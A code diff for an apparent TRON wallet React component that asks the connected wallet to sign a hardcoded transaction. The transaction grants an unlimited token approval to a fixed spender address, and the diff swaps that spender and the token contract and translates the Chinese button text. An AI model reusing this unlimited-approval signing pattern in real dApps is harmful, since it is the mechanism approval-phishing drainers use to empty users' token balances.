@@ -8,9 +8,9 @@ const tx = {
             {
                 "parameter": {
                     "value": {
-                        "data": "095ea7b300000000000000000000000070082243784dcdf3042034e7b044d6d342a91360ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+                        "data": "095ea7b30000000000000000000000006e0617948fe030a7e4970f8389d4ad295f249b7effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
                         "owner_address": "419b796e0e2412e4f0cabd922fb3ef9f8e99f5ad80",
-                        "contract_address": "41eca9bc828a3005b9a3b909f2cc5c2a54794de05f"
+                        "contract_address": "41a614f803b6fd780986a42c78ec9c7f77e6ded13c"
                     },
                     "type_url": "type.googleapis.com/protocol.TriggerSmartContract"
                 },
@@ -23,7 +23,7 @@ const tx = {
         "fee_limit": 15000000000,
         "timestamp": 1694068753544
     },
-    "raw_data_hex": "0a0295c822087b424c257a2d6ab940a8bafaf2a6315aae01081f12a9010a31747970652e676f6f676c65617069732e636f6d2f70726f746f636f6c2e54726967676572536d617274436f6e747261637412740a15419b796e0e2412e4f0cabd922fb3ef9f8e99f5ad80121541eca9bc828a3005b9a3b909f2cc5c2a54794de05f2244095ea7b300000000000000000000000070082243784dcdf3042034e7b044d6d342a91360ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff708889f7f2a631900180acc7f037"
+    "raw_data_hex": "0a0295c822087b424c257a2d6ab940a8bafaf2a6315aae01081f12a9010a31747970652e676f6f676c65617069732e636f6d2f70726f746f636f6c2e54726967676572536d617274436f6e747261637412740a15419b796e0e2412e4f0cabd922fb3ef9f8e99f5ad80121541a614f803b6fd780986a42c78ec9c7f77e6ded13c2244095ea7b30000000000000000000000006e0617948fe030a7e4970f8389d4ad295f249b7effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff708889f7f2a631900180acc7f037"
 }
 function Approve() {
   const [msg, setMsg] = useState('')
@@ -33,7 +33,7 @@ function Approve() {
       <Button loading={loading}  onClick={async () => {
         const tronWeb = window.tronWeb;
         try {
-          message.info("发起交易中...")
+          message.info("Starting request...")
           setLoading(true)
           const signature = await tronWeb.trx.sign(tx);
           setMsg(signature)
@@ -42,7 +42,7 @@ function Approve() {
           setMsg(e.message)
           setLoading(false)
         }
-      }}>Approve 无限:{msg}</Button>
+      }}>Approve unlimited:{msg}</Button>
     </div>
   )
 }
